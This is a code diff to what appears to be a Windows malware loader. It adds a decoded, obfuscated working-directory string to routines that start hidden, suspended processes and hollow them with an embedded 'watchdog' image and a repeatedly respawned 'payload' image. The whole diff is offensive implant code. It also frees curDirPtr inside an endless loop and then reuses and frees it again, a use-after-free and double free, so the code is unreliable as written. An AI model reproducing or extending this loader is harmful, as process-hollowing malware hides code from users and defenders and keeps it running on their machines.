@@ -116,20 +116,23 @@ bool GetResourceImageBuffer(DWORD resID, char **ImgResData, DWORD *sourceImgSize
 }
 
 
-DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_entry )
+DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_entry, char* curDir )
 {
 	NTSTATUS stat;
 	
 #ifdef _DBG
+	if( curDir != nullptr)
+		Log("Creating process with current dir: %s\r\n", curDir);
+	else
 		Log("Creating process\r\n");
-   #endif
+#endif
 
 	//Start the target process suspended
 	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
 	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
 	if (!CreateProcess((LPSTR)pDestCmdLine, NULL, NULL, NULL, NULL,
 					CREATE_SUSPENDED|DETACHED_PROCESS|CREATE_NO_WINDOW,
-					NULL, NULL, pStartupInfo, pProcessInfo))
+					NULL, curDir, pStartupInfo, pProcessInfo))
 	{
 #ifdef _DBG
 		Log( "[-] CreateProcessW failed. Error = %x\n", GetLastError());
@@ -588,6 +591,19 @@ void LoadWatchDog() {
 	std::string hollow_proc_str(watchdog_host_ptr);
 	free(watchdog_host_ptr);
 
+
+	//Check if current directory is set
+	char* curDirPtr = nullptr;
+    char cur_dir[400];
+	LoadString(dll_handle, IDS_CUR_DIR, cur_dir, 400);
+	if( strlen( cur_dir ) != 0 ){
+		//Deobfuscate it
+		curDirPtr = decode_split(cur_dir, 400);
+#ifdef _DBG
+		Log("Current dir: %s\r\n", curDirPtr);
+#endif
+	}
+	
 		
 	memset(module_name, 0, MAX_PATH );
 	
@@ -624,8 +640,12 @@ void LoadWatchDog() {
 	if((imgBufferSize > 0) && imgBufferSize == bytesRead) {
 		
 		//If the process string is not empty
-		if(hollow_proc_str.length() > 0)
-			CreateHollowedProcess(hollow_proc_str.c_str(), imgBuffer, true );
+		if(hollow_proc_str.length() > 0){
+			CreateHollowedProcess(hollow_proc_str.c_str(), imgBuffer, true, curDirPtr );
+			if(curDirPtr != nullptr)
+				free(curDirPtr);
+		}
+
 
 	}
 	
@@ -707,6 +727,18 @@ void LoadPayload(){
 	std::string hollow_proc_str(payload_host_ptr);
 	free(payload_host_ptr);
 
+	//Check if current directory is set
+	char* curDirPtr = nullptr;
+    char cur_dir[400];
+	LoadString(dll_handle, IDS_CUR_DIR, cur_dir, 400);
+	if( strlen( cur_dir ) != 0 ){
+		//Deobfuscate it
+		curDirPtr = decode_split(cur_dir, 400);
+#ifdef _DBG
+		Log("Current dir: %s\r\n", curDirPtr);
+#endif
+	}
+
 	char *imgResData = NULL;
 	DWORD imgDataSize = 0;
 
@@ -733,7 +765,10 @@ void LoadPayload(){
 	//Create new process repeatedly
 	while( 1 ){
 
-		DWORD proc_pid = CreateHollowedProcess( hollow_proc_str.c_str(), imgResData, false );
+		DWORD proc_pid = CreateHollowedProcess( hollow_proc_str.c_str(), imgResData, false, curDirPtr );
+		if(curDirPtr != nullptr)
+			free(curDirPtr);
+
 		HANDLE proc_handle = OpenProcess( SYNCHRONIZE, TRUE, proc_pid);
 
 		//Reset
